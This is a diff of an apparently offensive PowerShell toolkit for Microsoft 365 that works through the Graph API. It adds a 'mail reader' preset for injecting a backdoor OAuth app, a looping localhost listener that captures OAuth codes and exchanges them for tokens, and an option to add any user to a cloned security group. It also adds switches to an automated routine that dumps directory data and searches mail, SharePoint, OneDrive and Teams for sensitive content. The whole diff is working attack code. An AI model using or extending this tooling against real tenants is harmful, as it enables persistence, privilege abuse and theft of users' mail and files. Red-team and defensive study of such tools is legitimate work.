@@ -316,6 +316,11 @@ function Invoke-InjectOAuthApp{
         $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
         Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
     }
+    elseif ($Scope -like "mail reader")
+    {
+        $Scope = "openid","profile","offline_access","email","User.Read","Mail.Read","Mail.Read.Shared"
+        Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
+    }
     $scopeurl = ""
     $accesslist = ""
     $scopeIds = @{}
@@ -452,7 +457,7 @@ function Invoke-DeleteOAuthApp{
     
     .EXAMPLE
         
-        C:\PS> Invoke-DeleteOAuthApp
+        C:\PS> Invoke-DeleteOAuthApp -Tokens $tokens -ObjectID <object ID of app>
         Description
         -----------
         This command will delete the specified app registration from the tenant.
@@ -477,7 +482,7 @@ function Invoke-DeleteOAuthApp{
     $response = Invoke-RestMethod -Uri $deleteUrl -Headers $headers -Method Delete
 
     if ($response -ne $null) {
-        Write-Output "App registration with ID $appId deleted successfully."
+        Write-Output "App registration with ID $ObjectId deleted successfully."
     } else {
         Write-Error "Error deleting app registration."
     }
@@ -646,7 +651,14 @@ Function Get-AzureAppTokens{
     }
     if($request)
         {
-            $global:apptokens = $request.Content | ConvertFrom-Json
+            try{
+                $global:apptokens = $request.Content | ConvertFrom-Json
+            }
+            catch{
+                $details=$_.ErrorDetails.Message | ConvertFrom-Json
+                Write-Output $details.error
+                return
+            }
             Write-Output "---Here is your access token---"
             $apptokens.access_token
             Write-Output "---Here is your refresh token---"
@@ -813,34 +825,51 @@ Function Invoke-AutoOAuthFlow{
     [string]
     $RedirectUri = ""
     )
+    
     Add-Type -AssemblyName System.Web
 
+    $uri = [System.Uri]$RedirectUri
+
+    if ($uri.Port -eq -1) {
+        # Port is not specified in the RedirectUri
+        $port = if ($uri.Scheme -eq "https") { 443 } else { 80 }
+    } else {
+        $port = $uri.Port
+    }
+
     $listener = New-Object System.Net.HttpListener
-    $listener.Prefixes.Add("http://localhost:10000/")
+    $listener.Prefixes.Add("http://localhost:$port/")
     $listener.Start()
 
-    Write-Host "Listening for incoming requests on http://localhost:10000/"
+    Write-Host "Listening for incoming requests on http://localhost:$port/"
 
-    $context = $listener.GetContext() # This blocks until a request is received
-    $request = $context.Request
-    $response = $context.Response
+    $oauthcodes  = @()
+    while ($true) {
+        $context = $listener.GetContext() # This blocks until a request is received
+        $request = $context.Request
+        $response = $context.Response
 
-    # Capture the OAuth code from the query parameters
-    $queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
-    $oauthCode = $queryParams["code"]
+        # Capture the OAuth code from the query parameters
+        $queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
+        $oauthCode = $queryParams["code"]
+            
+        Write-Host "Captured OAuth code: $oauthCode"
 
-    # You can now process the OAuth code as needed
-    Write-Host "Captured OAuth code: $oauthCode"
+        # Respond to the client
+        $responseText = "OAuth code captured successfully."
+        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
+        $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
+        $response.Close()
+            
+        if($oauthCode -notin $oauthcodes){
+        Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
+        }
+        else{
+            Write-Host "[*] Skipping OAuth code we've already seen..."
+        }
+        $oauthcodes += $oauthCode
 
-    # Respond to the client
-    $responseText = "OAuth code captured successfully."
-    $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
-    $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
-    $response.Close()
-
-    $listener.Stop()
-
-    Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
+    }
 
 }
 
@@ -1717,6 +1746,7 @@ function Invoke-SecurityGroupCloner{
     }
 
     $secgroups = Get-SecurityGroups -AccessToken $accessToken
+    $secgroups
     $CloneGroup = ""
     while($CloneGroup -eq ""){
     Write-Host -ForegroundColor Cyan "[*] Enter a group name you want to clone:"
@@ -1751,6 +1781,38 @@ function Invoke-SecurityGroupCloner{
     } else {
         Write-Output "Invalid input. Please enter Yes or No."
     }
+
+    Write-Host -ForegroundColor Cyan "[*] Do you want to add a different user to the cloned group? (Yes/No)"
+    $difanswer = Read-Host 
+    $difanswer = $difanswer.ToLower()
+    if ($difanswer -eq "yes" -or $difanswer -eq "y") {
+        Write-Host -ForegroundColor Cyan "[*] What is the email address of the user you want to add?"
+        $useranswer = Read-Host 
+        $useranswer = $useranswer.ToLower()
+        Write-Host -ForegroundColor yellow "[*] Adding $useranswer to the cloned group..."
+        $uri = "https://graph.microsoft.com/v1.0/users"
+        $filter = "?`$filter=mail eq '$useranswer'"
+        $otheruserid = Invoke-RestMethod -Uri "$uri$filter" -Headers $headers
+        $userObjectId = $otheruserid.value[0].id
+        $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $userObjectId)
+    } elseif ($difanswer -eq "no" -or $difanswer -eq "n") {
+        Write-Output "[*] Not adding another user"
+    } else {
+        Write-Output "Invalid input. Please enter Yes or No."
+    }
+
+    Write-Host -ForegroundColor Cyan "[*] Do you want to change the group name or keep as is? ($CloneGroup)"
+    $groupanswer = Read-Host 
+    $groupanswer = $groupanswer.ToLower()
+    if ($groupanswer -eq "yes" -or $groupanswer -eq "y") {
+        Write-Host -ForegroundColor yellow "[*] What do you want the group name to be?"
+        $CloneGroup = Read-Host
+    } elseif ($groupanswer -eq "no" -or $groupanswer -eq "n") {
+        Write-host ('[*] Keeping the name "' + $CloneGroup + '"')
+    } else {
+        Write-Output "Invalid input. Please enter Yes or No."
+    }
+
 
     $memberIdsUniq = $memberIds | Select-Object -Unique
 
@@ -2873,6 +2935,7 @@ function Invoke-SearchSharePointAndOneDrive{
                 "Size" = $sizeFormatted
                 "Location" = $location
                 "DriveItemID" = ($driveid + ":" + $itemid)
+                "Preview" = $summary
             }
             
             $resultarray += New-Object PSObject -Property $resultInfo
@@ -3289,7 +3352,23 @@ function Invoke-GraphRunner{
     $Tokens = "",
     [Parameter(Position = 1, Mandatory = $false)]
     [string]
-    $DetectorFile = ".\default_detectors.json"
+    $DetectorFile = ".\default_detectors.json",
+    [switch]
+    $DisableRecon,
+    [switch]
+    $DisableUsers,
+    [switch]
+    $DisableGroups,
+    [switch]
+    $DisableCAPS,
+    [switch]
+    $DisableApps,
+    [switch]
+    $DisableEmail,
+    [switch]
+    $DisableSharePoint,
+    [switch]
+    $DisableTeams
     )
     
     if($Tokens){
@@ -3325,48 +3404,63 @@ function Invoke-GraphRunner{
     New-Item -Path $folderName -ItemType Directory | Out-Null
 
     # GraphRecon
-    Write-Host -ForegroundColor yellow "[*] Now running Invoke-GraphRecon."
-    Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
-
-    # Users
-    Write-Host -ForegroundColor yellow "[*] Now getting all users"
-    Get-AzureADUsers -Tokens $tokens -GraphRun -outfile "$folderName\users.txt"
-
-    # Groups
-    Write-Host -ForegroundColor yellow "[*] Now getting all groups"
-    Get-SecurityGroups -AccessToken $tokens.access_token -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
-
-    # CAPS
-    Write-Host -ForegroundColor yellow "[*] Now getting conditional access policies"
-    Invoke-DumpCAPS -Tokens $tokens -ResolveGuids -GraphRun | Out-File -Encoding ascii "$folderName\caps.txt"
-
-    # Apps
-    Write-Host -ForegroundColor yellow "[*] Now getting applications"
-    Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
-
-    # Email
-    $mailout = "$folderName\interesting-mail.csv"
-
-    Write-Host -ForegroundColor yellow "[*] Now searching Email using detector file $DetectorFile. Results will be written to $folderName."
-    foreach($detect in $detector.Detectors){
-        Invoke-SearchMailbox -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile $mailout -GraphRun -PageResults
+    if(!$DisableRecon){
+        Write-Host -ForegroundColor yellow "[*] Now running Invoke-GraphRecon."
+        Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
     }
 
-    # SharePoint and OneDrive Tests
-    $spout = "$folderName\interesting-files.csv"
+    # Users
+    if(!$DisableUsers){
+        Write-Host -ForegroundColor yellow "[*] Now getting all users"
+        Get-AzureADUsers -Tokens $tokens -GraphRun -outfile "$folderName\users.txt"
+    }
 
-    Write-Host -ForegroundColor yellow "[*] Now searching SharePoint and OneDrive using detector file $DetectorFile. Results will be written to $folderName."
-    foreach($detect in $detector.Detectors){
-        Invoke-SearchSharePointAndOneDrive  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun
+    # Groups
+    if(!$DisableGroups){
+        Write-Host -ForegroundColor yellow "[*] Now getting all groups"
+        Get-SecurityGroups -AccessToken $tokens.access_token -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
+    }
+
+    # CAPS
+    if(!$DisableCAPS){
+        Write-Host -ForegroundColor yellow "[*] Now getting conditional access policies"
+        Invoke-DumpCAPS -Tokens $tokens -ResolveGuids -GraphRun | Out-File -Encoding ascii "$folderName\caps.txt"
+    }
+
+    # Apps
+    if(!$DisableApps){
+        Write-Host -ForegroundColor yellow "[*] Now getting applications"
+        Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
+    }
+
+    # Email
+    if(!$DisableEmail){
+        $mailout = "$folderName\interesting-mail.csv"
+
+        Write-Host -ForegroundColor yellow "[*] Now searching Email using detector file $DetectorFile. Results will be written to $folderName."
+        foreach($detect in $detector.Detectors){
+            Invoke-SearchMailbox -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile $mailout -GraphRun -PageResults
+        }
+    }
+    
+    # SharePoint and OneDrive Tests
+    if(!$DisableSharePoint){
+        $spout = "$folderName\interesting-files.csv"
+
+        Write-Host -ForegroundColor yellow "[*] Now searching SharePoint and OneDrive using detector file $DetectorFile. Results will be written to $folderName."
+        foreach($detect in $detector.Detectors){
+            Invoke-SearchSharePointAndOneDrive  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun
+        }
     }
     
     # Teams
-    $teamsout = "$folderName\interesting-teamsmessages.csv"
-    Write-Host -ForegroundColor yellow "[*] Now searching Teams using detector file $DetectorFile. Results will be written to $folderName."
-    foreach($detect in $detector.Detectors){
-        Invoke-SearchTeams  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -ResultSize 500 -OutFile $teamsout -GraphRun
+    if(!$DisableTeams){
+        $teamsout = "$folderName\interesting-teamsmessages.csv"
+        Write-Host -ForegroundColor yellow "[*] Now searching Teams using detector file $DetectorFile. Results will be written to $folderName."
+        foreach($detect in $detector.Detectors){
+            Invoke-SearchTeams  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -ResultSize 500 -OutFile $teamsout -GraphRun
+        }
     }
-
 
     Write-Host -ForegroundColor yellow "[*] Results have been written to $folderName"
 }
